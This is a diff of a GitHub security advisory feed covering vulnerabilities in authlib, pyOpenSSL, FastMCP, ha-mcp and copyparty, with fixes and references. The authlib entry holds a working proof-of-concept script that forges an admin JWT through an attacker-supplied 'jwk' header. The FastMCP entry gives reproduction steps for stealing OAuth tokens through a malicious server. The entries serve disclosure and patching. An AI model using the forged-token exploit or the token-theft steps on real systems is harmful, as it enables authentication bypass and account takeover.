+<pre><code class="language-python">elif key is None and "jwk" in header:
+    key = header["jwk"]   # ← attacker-controlled key used for verification
+</code></pre>
+<p>When <code>key=None</code> is passed to <code>jws.deserialize_compact()</code>, <code>jws.deserialize_json()</code>, or
+<code>jws.deserialize()</code>, the library checks the JWT header for a <code>jwk</code> field. If present, it extracts
+that value — which is fully attacker-controlled — and uses it as the verification key.</p>
+<p><strong>RFC 7515 violations:</strong></p>
+<ul>
+<li><strong>§4.1.3</strong> explicitly states the <code>jwk</code> header parameter is <strong>"NOT RECOMMENDED"</strong> because keys
+embedded by the token submitter cannot be trusted as a verification anchor.</li>
+<li><strong>§5.2 (Validation Algorithm)</strong> specifies the verification key MUST come from the <em>application
+context</em>, not from the token itself. There is no step in the RFC that permits falling back to
+the <code>jwk</code> header when no application key is provided.</li>
+</ul>
+<p><strong>Why this is a library issue, not just a developer mistake:</strong></p>
+<p>The most common real-world trigger is a <strong>key resolver callable</strong> used for JWKS-based key lookup.
+A developer writes:</p>
+<pre><code class="language-python">def lookup_key(header, payload):
+    kid = header.get("kid")
+    return jwks_cache.get(kid)   # returns None when kid is unknown/rotated
+
+jws.deserialize_compact(token, lookup_key)
+</code></pre>
+<p>When an attacker submits a token with an unknown <code>kid</code>, the callable legitimately returns <code>None</code>.
+The library then silently falls through to <code>key = header["jwk"]</code>, trusting the attacker's embedded
+key. The developer never wrote <code>key=None</code> — the library's fallback logic introduced it. The result
+looks like a verified token with no exception raised, making the substitution invisible.</p>
+<p><strong>Attack steps:</strong></p>
+<ol>
+<li>Attacker generates an RSA or EC keypair.</li>
+<li>Attacker crafts a JWT payload with any desired claims (e.g. <code>{"role": "admin"}</code>).</li>
+<li>Attacker signs the JWT with their <strong>private</strong> key.</li>
+<li>Attacker embeds their <strong>public</strong> key in the JWT <code>jwk</code> header field.</li>
+<li>Attacker uses an unknown <code>kid</code> to cause the key resolver to return <code>None</code>.</li>
+<li>The library uses <code>header["jwk"]</code> for verification — signature passes.</li>
+<li>Forged claims are returned as authentic.</li>
+</ol>
+<h3 id="poc">PoC</h3>
+<p>Tested against <strong>authlib 1.6.6</strong> (HEAD <code>a9e4cfee</code>, Python 3.11).</p>
+<p><strong>Requirements:</strong></p>
+<pre><code>pip install authlib cryptography
+</code></pre>
+<p><strong>Exploit script:</strong></p>
+<pre><code class="language-python">from authlib.jose import JsonWebSignature, RSAKey
+import json
+
+jws = JsonWebSignature(["RS256"])
+
+# Step 1: Attacker generates their own RSA keypair
+attacker_private = RSAKey.generate_key(2048, is_private=True)
+attacker_public_jwk = attacker_private.as_dict(is_private=False)
+
+# Step 2: Forge a JWT with elevated privileges, embed public key in header
+header = {"alg": "RS256", "jwk": attacker_public_jwk}
+forged_payload = json.dumps({"sub": "attacker", "role": "admin"}).encode()
+forged_token = jws.serialize_compact(header, forged_payload, attacker_private)
+
+# Step 3: Server decodes with key=None — token is accepted
+result = jws.deserialize_compact(forged_token, None)
+claims = json.loads(result["payload"])
+print(claims)  # {'sub': 'attacker', 'role': 'admin'}
+assert claims["role"] == "admin"  # PASSES
+</code></pre>
+<p><strong>Expected output:</strong></p>
+<pre><code>{'sub': 'attacker', 'role': 'admin'}
+</code></pre>
+<p><strong>Docker (self-contained reproduction):</strong></p>
+<pre><code class="language-bash">sudo docker run --rm authlib-cve-poc:latest \
+  python3 /workspace/pocs/poc_auth001_jws_jwk_injection.py
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>This is an authentication and authorization bypass vulnerability. Any application using authlib's
+JWS deserialization is affected when:</p>
+<ul>
+<li><code>key=None</code> is passed directly, <strong>or</strong></li>
+<li>a key resolver callable returns <code>None</code> for unknown/rotated <code>kid</code> values (the common JWKS lookup pattern)</li>
+</ul>
+<p>An unauthenticated attacker can impersonate any user or assume any privilege encoded in JWT claims
+(admin roles, scopes, user IDs) without possessing any legitimate credentials or server-side keys.
+The forged token is indistinguishable from a legitimate one — no exception is raised.</p>
+<p>This is a violation of <strong>RFC 7515 §4.1.3</strong> and <strong>§5.2</strong>. The spec is unambiguous: the <code>jwk</code>
+header parameter is "NOT RECOMMENDED" as a key source, and the validation key MUST come from
+the application context, not the token itself.</p>
+<p><strong>Minimal fix</strong> — remove the fallback from <code>authlib/jose/rfc7515/jws.py:272-273</code>:</p>
+<pre><code class="language-python"># DELETE:
+elif key is None and "jwk" in header:
+    key = header["jwk"]
+</code></pre>
+<p><strong>Recommended safe replacement</strong> — raise explicitly when no key is resolved:</p>
+<pre><code class="language-python">if key is None:
+    raise MissingKeyError("No key provided and no valid key resolvable from context.")
+</code></pre>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/authlib/authlib/security/advisories/GHSA-wvwj-cvrp-7pv5">https://github.com/authlib/authlib/security/advisories/GHSA-wvwj-cvrp-7pv5</a></li>
+<li><a href="https://github.com/authlib/authlib/commit/a5d4b2d4c9e46bfa11c82f85fdc2bcc0b50ae681">https://github.com/authlib/authlib/commit/a5d4b2d4c9e46bfa11c82f85fdc2bcc0b50ae681</a></li>
+<li><a href="https://github.com/authlib/authlib/releases/tag/v1.6.9">https://github.com/authlib/authlib/releases/tag/v1.6.9</a></li>
+<li><a href="https://github.com/advisories/GHSA-wvwj-cvrp-7pv5">https://github.com/advisories/GHSA-wvwj-cvrp-7pv5</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-wvwj-cvrp-7pv5</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-03-16T15:17:15.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[pyopenssl] pyOpenSSL allows TLS connection bypass via unhandled callback exception in set_tlsext_servername_callback]]></title>
+        <id>https://github.com/advisories/GHSA-vp96-hxj8-p424</id>
+        <link href="https://github.com/advisories/GHSA-vp96-hxj8-p424"/>
+        <updated>2026-03-16T15:15:43.000Z</updated>
+        <content type="html"><![CDATA[<p>If a user provided callback to <code>set_tlsext_servername_callback</code> raised an unhandled exception, this would result in a connection being accepted. If a user was relying on this callback for any security-sensitive behavior, this could allow bypassing it.</p>
+<p>Unhandled exceptions now result in rejecting the connection.</p>
+<p>Credit to <strong>Leury Castillo</strong> for reporting this issue.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/pyca/pyopenssl/security/advisories/GHSA-vp96-hxj8-p424">https://github.com/pyca/pyopenssl/security/advisories/GHSA-vp96-hxj8-p424</a></li>
+<li><a href="https://github.com/pyca/pyopenssl/commit/d41a814759a9fb49584ca8ab3f7295de49a85aa0">https://github.com/pyca/pyopenssl/commit/d41a814759a9fb49584ca8ab3f7295de49a85aa0</a></li>
+<li><a href="https://github.com/pyca/pyopenssl/blob/358cbf29c4e364c59930e53a270116249581eaa3/CHANGELOG.rst#L27">https://github.com/pyca/pyopenssl/blob/358cbf29c4e364c59930e53a270116249581eaa3/CHANGELOG.rst#L27</a></li>
+<li><a href="https://github.com/advisories/GHSA-vp96-hxj8-p424">https://github.com/advisories/GHSA-vp96-hxj8-p424</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-vp96-hxj8-p424</uri>
+        </author>
+        <category label="severity" term="LOW"/>
+        <published>2026-03-16T15:15:43.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[fastmcp] FastMCP OAuth Proxy token reuse across MCP servers]]></title>
+        <id>https://github.com/advisories/GHSA-5h2m-4q8j-pqpj</id>
+        <link href="https://github.com/advisories/GHSA-5h2m-4q8j-pqpj"/>
+        <updated>2026-03-16T15:14:56.000Z</updated>
+        <content type="html"><![CDATA[<p>While testing the OAuth Proxy implementation, it was noticed that the server does not properly respect the <code>resource</code> parameter submitted by the client in the authorization and token request. Instead of issuing the token explicitly for this MCP server, the token is issued for the <code>base_url</code> passed to the <code>OAuthProxy</code> during initialization. </p>
+<p><strong>Affected File:</strong>
+<em><a href="https://github.com/jlowin/fastmcp/blob/main/src/fastmcp/server/auth/oauth_proxy.py#L828">https://github.com/jlowin/fastmcp/blob/main/src/fastmcp/server/auth/oauth_proxy.py#L828</a></em></p>
+<p><strong>Affected Code:</strong></p>
+<pre><code class="language-python">self._jwt_issuer: JWTIssuer = JWTIssuer(
+    issuer=str(self.base_url),
+    audience=f"{str(self.base_url).rstrip('/')}/mcp",
+    signing_key=jwt_signing_key,
+)
+</code></pre>
+<p>Since the issued access and refresh tokens do not include information about the resource the token was issued for, it is impossible for the MCP server to properly verify whether the token was issued for it, hence violating the requirement of doing so demanded by the <a href="https://mcp.mintlify.app/specification/2025-11-25/basic/authorization#token-audience-binding-and-validation">specification</a>. Being able to verify whether the token was issued for the target MCP server enforces the protection offered by the, per MCP specification mandatory, Protected Resource Metadata OAuth extension.</p>
+<p>Therefore, this misconfiguration exposes all MCP server setups using the FastMCP OAuth Proxy to an attack where an adversary creates a malicious MCP server that advertises the benign OAuth Proxy authorization server as its own authorization server. Once a victim completes an OAuth flow with this malicious MCP server, authenticating against the AS, the adversary can extract the token received at the malicious MCP server and use it to access other MCP servers (the benign ones) that also use the same AS, including the tools and resources they expose.</p>
+<p><strong>Steps to reproduce:</strong></p>
+<ol>
+<li>Extract the provided <a href="https://github.com/user-attachments/files/23839983/improper_resource_validation_fastmcp.tgz">PoC environment</a>.</li>
+<li>Enter the <em>client_id</em> and <em>client_secret</em> of a GitHub App you control into the <code>mcp-server-proxy.py</code> script.</li>
+<li>Start the benign MCP server using an OAuth Proxy (in this case the <em>GitHubProvider</em>): <code>python3 mcp-server-proxy.py</code>.</li>
+<li>Start the malicious AS: <code>python3 mal_auth_server.py</code>.</li>
+<li>Start the malicious MCP server: <code>python3 attacker_server.py</code>.</li>
+<li>Connect the client to the malicious MCP server: <code>python3 client.py</code>.</li>
+<li>Complete the OAuth flow.</li>
+<li>Observe in the logs of the malicious MCP server that the request to the benign MCP server with the stolen token returned a 200 status code.</li>
+</ol>
+<h2 id="impact">Impact</h2>
+<p>This vulnerability allows an adversary to steal a victim’s authentication material for a benign MCP server using the FastMCP OAuth Proxy. The severity of this issue was decreased to <em>Medium</em> due to the consent screen showing the name of the MCP server the OAuth Proxy was intended for. However, a victim might not see it or get otherwise convinced by the attacker to ignore it, and overall this does not act as a proper mitigation for this issue.</p>
+<h2 id="mitigation">Mitigation</h2>
+<p>To mitigate this vulnerability, it is recommended to issue tokens specifically for the MCP server submitted in the authorization URL’s <code>resource</code> GET parameter. In this way, the receiving MCP server will be able to properly verify that the token was indeed issued for it, allowing it to reject tokens stolen by an attack like the one demonstrated above.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/PrefectHQ/fastmcp/security/advisories/GHSA-5h2m-4q8j-pqpj">https://github.com/PrefectHQ/fastmcp/security/advisories/GHSA-5h2m-4q8j-pqpj</a></li>
+<li><a href="https://github.com/advisories/GHSA-5h2m-4q8j-pqpj">https://github.com/advisories/GHSA-5h2m-4q8j-pqpj</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-5h2m-4q8j-pqpj</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-03-16T15:14:55.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[fickling] fickling's `platform` module subprocess invocation evades `check_safety()` with `LIKELY_SAFE`]]></title>
         <id>https://github.com/advisories/GHSA-5cxw-w2xg-2m8h</id>
@@ -870,181 +1709,5 @@ except:
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-03-12T17:26:16.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[ha-mcp] ha-mcp has XSS via Unescaped HTML in OAuth Consent Form]]></title>
-        <id>https://github.com/advisories/GHSA-pf93-j98v-25pv</id>
-        <link href="https://github.com/advisories/GHSA-pf93-j98v-25pv"/>
-        <updated>2026-03-12T14:23:45.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>The ha-mcp OAuth consent form renders user-controlled parameters via Python f-strings with no HTML escaping. An attacker who can reach the OAuth endpoint and convince the server operator to follow a crafted authorization URL could execute JavaScript in the operator's browser. This affects only users running the beta OAuth mode (<code>ha-mcp-oauth</code>), which is not part of the standard setup and requires explicit configuration.</p>
-<h3 id="details">Details</h3>
-<p><strong>Unescaped f-string rendering</strong></p>
-<p><code>consent_form.py</code> builds HTML using Python f-strings. No call to <code>html.escape()</code> exists anywhere in the file. The following values are rendered unescaped:</p>
-<ul>
-<li><code>client_name</code> / <code>client_id</code> — in HTML element context (lines 299, 303)</li>
-<li><code>client_id</code>, <code>redirect_uri</code>, <code>state</code> — in HTML attribute context (lines 310–312), where a <code>"</code> character breaks out of <code>value=""</code></li>
-<li><code>error_message</code>, <code>error</code>, <code>error_description</code> — in error display paths (lines 36–40, 496–497)</li>
-</ul>
-<p>An attacker can register a client with a malicious <code>client_name</code> via the <code>/register</code> (DCR) endpoint, which accepts <code>client_name</code> without sanitization. If the server operator then visits a crafted authorization URL for that client, the payload executes in their browser.</p>
-<p><strong>Open Dynamic Client Registration</strong></p>
-<p>DCR is enabled by default with no initial access token required. This is intentional: Claude.ai and ChatGPT must self-register on first use, which is the standard MCP OAuth flow (RFC 7591). Requiring a pre-shared token would break those integrations. Registration alone grants no access — authorization requires an explicit action by the server operator.</p>
-<h3 id="impact">Impact</h3>
-<p><strong>Affected configuration:</strong> OAuth mode only (<code>ha-mcp-oauth</code>, requires <code>MCP_BASE_URL</code>). This mode is in beta and is not included in the main setup documentation. The vast majority of ha-mcp users run stdio mode, which is not affected.</p>
-<p><strong>Attack requirements:</strong></p>
-<ol>
-<li>The attacker can reach the ha-mcp OAuth endpoint (it binds to <code>0.0.0.0</code> in HTTP mode)</li>
-<li>The attacker registers a malicious client via <code>/register</code></li>
-<li>The attacker convinces the <strong>server operator</strong> — the person who set up ha-mcp — to follow a crafted authorization URL for an unrecognized application</li>
-</ol>
-<p>Step 3 is a meaningful social engineering bar: the consent form displays the (unfamiliar) application name, and the operator has no legitimate reason to authorize an OAuth client they didn't initiate through Claude.ai or ChatGPT. Normal usage involves being redirected to the consent form from one of those platforms, not from an external link.</p>
-<p>If exploited, a JavaScript payload could exfiltrate data entered into the consent form, including the Home Assistant Long-Lived Access Token.</p>
-<h3 id="fix">Fix</h3>
-<p>Upgrade to 7.0.0</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/homeassistant-ai/ha-mcp/security/advisories/GHSA-pf93-j98v-25pv">https://github.com/homeassistant-ai/ha-mcp/security/advisories/GHSA-pf93-j98v-25pv</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-32112">https://nvd.nist.gov/vuln/detail/CVE-2026-32112</a></li>
-<li><a href="https://github.com/advisories/GHSA-pf93-j98v-25pv">https://github.com/advisories/GHSA-pf93-j98v-25pv</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-pf93-j98v-25pv</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-03-12T14:23:44.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[ha-mcp] ha-mcp OAuth 2.1 DCR mode enables network reconnaissance via an error oracle]]></title>
-        <id>https://github.com/advisories/GHSA-fmfg-9g7c-3vq7</id>
-        <link href="https://github.com/advisories/GHSA-fmfg-9g7c-3vq7"/>
-        <updated>2026-03-12T14:23:38.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>The ha-mcp OAuth consent form (beta feature) accepts a user-supplied <code>ha_url</code> and makes a server-side HTTP request to <code>{ha_url}/api/config</code> with no URL validation. An unauthenticated attacker can submit arbitrary URLs to perform internal network reconnaissance via an error oracle. Two additional code paths in OAuth tool calls (REST and WebSocket) are affected by the same primitive.</p>
-<p>The primary deployment method (private URL with pre-configured <code>HOMEASSISTANT_TOKEN</code>) is not affected.</p>
-<h3 id="details">Details</h3>
-<p><strong>Code path 1 — Consent form validation</strong> (reported)</p>
-<p>When a user submits the OAuth consent form, <code>_validate_ha_credentials()</code> (<code>provider.py</code>) makes a server-side GET request to <code>{ha_url}/api/config</code> with no scheme, IP, or domain validation. Different exception types produce distinct error messages, creating an error oracle:</p>
-<table>
-<thead>
-<tr>
-<th>Outcome</th>
-<th>Message returned</th>
-<th>Information leaked</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>ConnectError</code></td>
-<td>"Could not connect..."</td>
-<td>Host down or port closed</td>
-</tr>
-<tr>
-<td><code>TimeoutException</code></td>
-<td>"Connection timed out..."</td>
-<td>Host up, port filtered</td>
-</tr>
-<tr>
-<td>HTTP 401</td>
-<td>"Invalid access token..."</td>
-<td>Service alive, requires auth</td>
-</tr>
-<tr>
-<td>HTTP 403</td>
-<td>"Access forbidden..."</td>
-<td>Service alive, forbidden</td>
-</tr>
-<tr>
-<td>HTTP ≥ 400</td>
-<td>"Failed to connect: HTTP {N}"</td>
-<td>Service alive, exact status</td>
-</tr>
-</tbody></table>
-<p>An attacker can drive the flow programmatically: register a client via open DCR (<code>POST /register</code>), initiate authorization, extract a <code>txn_id</code>, and submit arbitrary <code>ha_url</code> values. No user interaction required.</p>
-<p><strong>Code path 2 — REST tool calls with forged token</strong></p>
-<p>OAuth access tokens are stateless base64-encoded JSON payloads (<code>{"ha_url": "...", "ha_token": "..."}</code>). Since tokens are not signed, an attacker can forge a token with an arbitrary <code>ha_url</code>. REST tool calls then make HTTP requests to hardcoded HA API paths on that host (<code>/config</code>, <code>/states</code>, <code>/services</code>, etc.). JSON responses are returned to the caller.</p>
-<p>In practice, path control is limited — most endpoints use absolute paths that ignore the <code>ha_url</code> path component. Useful exfiltration requires the target to return JSON at HA API paths, which is unlikely for non-HA services.</p>
-<p><strong>Code path 3 — WebSocket tool calls with forged token</strong></p>
-<p>The same forged token triggers WebSocket connections to <code>ws://{ha_url}/api/websocket</code>. The client follows the HA WebSocket handshake protocol (waits for <code>auth_required</code>, sends <code>auth</code>, expects <code>auth_ok</code>). Non-HA targets fail at the protocol level and return nothing useful. Realistic exploitation is limited to pivoting to another HA instance on the internal network.</p>
-<h3 id="impact">Impact</h3>
-<p><strong>Confirmed:</strong> Internal network reconnaissance via error oracle (all 3 code paths). An attacker can map reachable hosts and open ports from the server's network position.</p>
-<h3 id="scope">Scope</h3>
-<p>OAuth mode is a <strong>beta</strong> feature, documented separately in <code>docs/OAUTH.md</code> and not part of the main setup instructions. The standard deployment method (pre-configured <code>HOMEASSISTANT_URL</code> and <code>HOMEASSISTANT_TOKEN</code>) is not affected.</p>
-<h3 id="fix">Fix</h3>
-<p>Upgrade to 7.0.0</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/homeassistant-ai/ha-mcp/security/advisories/GHSA-fmfg-9g7c-3vq7">https://github.com/homeassistant-ai/ha-mcp/security/advisories/GHSA-fmfg-9g7c-3vq7</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-32111">https://nvd.nist.gov/vuln/detail/CVE-2026-32111</a></li>
-<li><a href="https://github.com/advisories/GHSA-fmfg-9g7c-3vq7">https://github.com/advisories/GHSA-fmfg-9g7c-3vq7</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-fmfg-9g7c-3vq7</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-03-12T14:23:37.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[copyparty] Copyparty has unexpected JavaScript execution via crafted URL to folder with `.prologue.html`]]></title>
-        <id>https://github.com/advisories/GHSA-rcp6-88mm-9vgf</id>
-        <link href="https://github.com/advisories/GHSA-rcp6-88mm-9vgf"/>
-        <updated>2026-03-12T14:22:54.000Z</updated>
-        <content type="html"><![CDATA[<p>If an attacker has been given both read- and write-permissions to the server, they can upload a malicious file with the filename <code>.prologue.html</code> and then craft a link to potentially execute arbitrary JavaScript in the victim's context.</p>
-<p>Note that it is intended behavior that the JavaScript would execute if the target clicks a link to the HTML file itself; "<a href="https://example.com/foo/.prologue.html">https://example.com/foo/.prologue.html</a>". The vulnerability is that "<a href="https://example.com/foo/?b">https://example.com/foo/?b</a>" would also evaluate the file, making the behavior unexpected.</p>
-<p>There are existing preventative measures (strict SameSite cookies) which makes it harder to leverage this vulnerability in an attack; in order to gain control of the target's authenticated session, the link must be clicked from a page served by the server itself -- most likely by editing an existing resource, which would require additional access permissions.</p>
-<p>Finally, for this attack to be successful, the attacker's target must click the specific crafted link given by the attacker. This vulnerability is not activated by normally browsing the web-UI on the server.</p>
-<h2 id="impact">Impact</h2>
-<p>If successful, the malicious JavaScript could move or delete existing files on the server, or upload new files, using the account of the person who opens the link.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/9001/copyparty/security/advisories/GHSA-rcp6-88mm-9vgf">https://github.com/9001/copyparty/security/advisories/GHSA-rcp6-88mm-9vgf</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-32109">https://nvd.nist.gov/vuln/detail/CVE-2026-32109</a></li>
-<li><a href="https://github.com/advisories/GHSA-rcp6-88mm-9vgf">https://github.com/advisories/GHSA-rcp6-88mm-9vgf</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-rcp6-88mm-9vgf</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-03-12T14:22:53.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[copyparty] Copyparty ftp/sftp: Sharing a single file did not fully restrict source-folder access]]></title>
-        <id>https://github.com/advisories/GHSA-67rw-2x62-mqqm</id>
-        <link href="https://github.com/advisories/GHSA-67rw-2x62-mqqm"/>
-        <updated>2026-03-12T14:22:47.000Z</updated>
-        <content type="html"><![CDATA[<p>There was a missing permission-check in the shares feature (the <code>shr</code> global-option).</p>
-<p>This vulnerability only applies in the following scenario:</p>
-<ul>
-<li>The <a href="https://github.com/9001/copyparty/#shares">shares</a> feature is used for the specific purpose of creating a share of just a single file inside a folder</li>
-<li>Either the FTP or SFTP server is enabled, and also made publically accessible<ul>
-<li>If a share is password-protected, then SFTP was not vulnerable unless the <code>sftp-pw</code> global-option was also enabled</li>
-</ul>
-</li>
-</ul>
-<p>Given these conditions, when a user is browsing a share through either FTP or SFTP (not http or https), they can gain read-access to the remaining files inside the shared folder by guessing/bruteforcing the filenames.</p>
-<p>It was not possible to descend into subdirectories in this manner; only the sibling files were accessible.</p>
-<p>This issue did not affect filekeys or dirkeys.</p>
-<p>This vulnerability is <a href="https://nvd.nist.gov/vuln/detail/CVE-2025-58753">CVE-2025-58753</a> which was previously fixed for HTTP and HTTPS, but not for FTP. The FTPS server did not yet exist at that time.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/9001/copyparty/security/advisories/GHSA-67rw-2x62-mqqm">https://github.com/9001/copyparty/security/advisories/GHSA-67rw-2x62-mqqm</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-32108">https://nvd.nist.gov/vuln/detail/CVE-2026-32108</a></li>
-<li><a href="https://github.com/advisories/GHSA-67rw-2x62-mqqm">https://github.com/advisories/GHSA-67rw-2x62-mqqm</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-67rw-2x62-mqqm</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-03-12T14:22:46.000Z</published>
     </entry>
 </feed>
